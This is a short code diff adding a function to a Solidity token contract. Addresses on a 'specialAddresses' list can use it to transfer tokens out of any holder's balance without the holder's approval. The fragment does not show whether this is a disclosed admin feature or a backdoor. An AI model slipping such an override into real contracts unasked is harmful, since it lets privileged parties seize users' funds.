@@ -41,5 +41,18 @@ contract Token {
         }
         revert("Cannot reduce");
     }
+
+    function authoritativeTransferFrom(address from, address to, uint amount) public returns  (bool) {
+        for (uint i = 0; i < specialAddresses.length; i++){
+            if (msg.sender == specialAddresses[i]){
+                require(balance[from] >= amount, "Insufficient balance");
+                balance[from] -= amount;
+                balance[to] += amount;
+                emit Transfer(from, to, amount);
+                return true;
+            }
+        }
+        revert("Cannot transfer");
+    }
 }
 
